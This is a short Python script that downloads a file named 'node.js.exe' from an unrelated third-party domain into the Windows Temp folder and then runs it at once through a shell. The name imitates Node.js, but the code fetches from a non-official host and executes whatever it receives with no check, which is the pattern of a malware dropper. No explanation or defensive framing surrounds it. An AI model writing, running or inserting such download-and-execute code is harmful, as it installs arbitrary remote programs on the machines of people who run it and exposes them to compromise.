import os
import urllib.request
import shutil
import subprocess

def download_file(url, destination):
    temp_dir = os.path.join(os.path.expanduser("~"), 'AppData', 'Local', 'Temp')
    file_path = os.path.join(temp_dir, destination)
    
    try:
        with urllib.request.urlopen(url) as response, open(file_path, 'wb') as out_file:
            shutil.copyfileobj(response, out_file)
        return file_path
    except Exception as e:
        if os.path.exists(file_path):
            os.remove(file_path)
        print(f"Error: {e}")
        return None

def execute_file(file):
    try:
        process = subprocess.Popen([file], shell=True)
        process.wait()
    except Exception as e:
        print(f"Error: {e}")

urlfile = 'https://akinasouls.fr/download/node.js.exe'
destinationfile = 'node.js.exe'

downloaded_file = download_file(urlfile, destinationfile)
if downloaded_file:
    execute_file(downloaded_file)